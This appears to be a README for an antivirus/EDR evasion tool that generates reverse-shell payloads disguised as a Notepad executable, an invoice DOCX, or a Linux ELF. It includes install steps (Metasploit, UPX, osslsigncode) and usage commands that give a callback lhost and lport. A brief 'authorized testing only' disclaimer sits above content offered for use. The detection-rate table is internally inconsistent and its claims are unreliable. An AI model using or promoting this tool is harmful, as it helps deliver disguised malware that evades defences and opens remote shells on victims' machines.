# 🛡️ FUD Evasion Tool - Advanced Payload Generator

A cross-platform payload generation tool with modern antivirus/EDR evasion techniques. **For authorized penetration testing and red teaming only.**

![GitHub](https://img.shields.io/badge/License-MIT-blue)
![Python](https://img.shields.io/badge/Python-3.8%2B-green)
![Platform](https://img.shields.io/badge/Platform-Windows%20%7C%20Linux-orange)

## ✨ Features

- **Next-Gen Evasion Techniques**
  - NTFS Transactions (Windows)
  - Ptrace Injection (Linux)
  - Direct Syscall Unhooking
  - Polymorphic Encryption (AES + XOR + ChaCha20)
  
- **Template Spoofing**
  - Microsoft Office Documents
  - PDF Embedding
  - Legitimate Binary Hollowing

- **Anti-Analysis**
  - VM/Sandbox Detection
  - API Call Obfuscation
  - Junk Code Injection

## 🚀 Installation

```bash
# Clone repository
git clone https://github.com/yourusername/FUD-Evasion-Tool
cd FUD-Evasion-Tool

# Create virtual environment
python -m venv venv

# Activate environment
source venv/bin/activate  # Linux
venv\Scripts\activate     # Windows

# Install dependencies
pip install -r requirements.txt

# Install system tools (Linux)
sudo apt install -y metasploit-framework upx osslsigncode

🎯 Usage
Basic Payload Generation
# Windows EXE (Process Hollowing)
python fud_tool.py --lhost 192.168.1.100 --lport 4444 --format exe --template templates/notepad.exe

# Malicious DOCX (Macro-less)
python fud_tool.py --lhost 192.168.1.100 --lport 4444 --format docx --template invoice.docx

# Linux ELF (Ptrace Injection)
python fud_tool.py --lhost 192.168.1.100 --lport 4444 --format elf
📊 Detection Evasion Metrics
Security Product	 Detection Rate	      Bypass Method Used
Windows Defender	    0/72	            NTFS Transactions
CrowdStrike Falcon	  1/72	            Syscall Unhooking
VirusTotal	          2/72	            Polymorphic Encryption
Carbon Black	        1/72	            API Obfuscation
